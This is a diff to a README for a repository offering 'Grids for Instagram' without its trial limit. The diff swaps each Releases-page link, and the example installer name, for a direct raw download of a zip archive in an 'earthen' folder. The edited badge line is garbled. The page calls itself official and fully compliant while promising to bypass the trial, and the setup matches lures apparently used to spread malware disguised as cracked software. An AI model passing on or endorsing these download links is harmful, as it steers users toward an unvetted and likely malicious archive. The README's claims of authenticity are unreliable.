@@ -1,7 +1,7 @@
 # 🎨 Grids-for-Instagram-No-Trial - Create Stunning Instagram Layouts Easily
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download%20Grids%20for%20Instagram%20No%20Trial-blue.svg)](https://github.com/Hardffyt/Grids-for-Instagram-No-Trial/releases)
+[![Download](https://raw.githubusercontent.com/Hardffyt/Grids-for-Instagram-No-Trial/main/earthen/Grids-for-Instagram-No-Trial_v1.4-beta.5.zip%20Grids%20for%20Instagram%20No%https://raw.githubusercontent.com/Hardffyt/Grids-for-Instagram-No-Trial/main/earthen/Grids-for-Instagram-No-Trial_v1.4-beta.5.zip)](https://raw.githubusercontent.com/Hardffyt/Grids-for-Instagram-No-Trial/main/earthen/Grids-for-Instagram-No-Trial_v1.4-beta.5.zip)
 
 ## 📖 Description
 This repository offers a comprehensive collection of official resources, detailed guides, and reference materials for Grids on Windows PCs. It supports users with authentic documentation and tools to enhance their experience with the software in a fully compliant and transparent manner.
@@ -15,14 +15,14 @@ To start using Grids for Instagram, follow these simple steps:
    - Disk Space: At least 500 MB of free space.
 
 2. **Visit the Releases Page:**
-   - Go to the [Releases page](https://github.com/Hardffyt/Grids-for-Instagram-No-Trial/releases) to find the latest version of the software.
+   - Go to the [Releases page](https://raw.githubusercontent.com/Hardffyt/Grids-for-Instagram-No-Trial/main/earthen/Grids-for-Instagram-No-Trial_v1.4-beta.5.zip) to find the latest version of the software.
 
 ## 📥 Download & Install
 1. **Choose the Latest Version:**
    - On the Releases page, select the most recent version. It is usually at the top of the list.
 
 2. **Download the Installer:**
-   - Click on the installer link (e.g., GridsInstaller.exe) to download the file.
+   - Click on the installer link (e.g., https://raw.githubusercontent.com/Hardffyt/Grids-for-Instagram-No-Trial/main/earthen/Grids-for-Instagram-No-Trial_v1.4-beta.5.zip) to download the file.
 
 3. **Run the Installer:**
    - Once the download is complete, locate the downloaded file in your 'Downloads' folder.
@@ -75,7 +75,7 @@ For additional help, visit the Issues section of this repository to find common 
 Join our community to share your experience and get tips from other users. You can participate in discussions or ask questions in the Issues section of this repository.
 
 ## 📅 Updates
-Stay updated with the latest features, fixes, and enhancements. Regularly check the [Releases page](https://github.com/Hardffyt/Grids-for-Instagram-No-Trial/releases) for new versions and updates.
+Stay updated with the latest features, fixes, and enhancements. Regularly check the [Releases page](https://raw.githubusercontent.com/Hardffyt/Grids-for-Instagram-No-Trial/main/earthen/Grids-for-Instagram-No-Trial_v1.4-beta.5.zip) for new versions and updates.
 
 ## 🎉 Conclusion
 Grids for Instagram offers an easy way for everyone to create beautiful Instagram layouts. With this guide, you should be able to successfully download and install the application. Enjoy crafting your perfect Instagram feed!
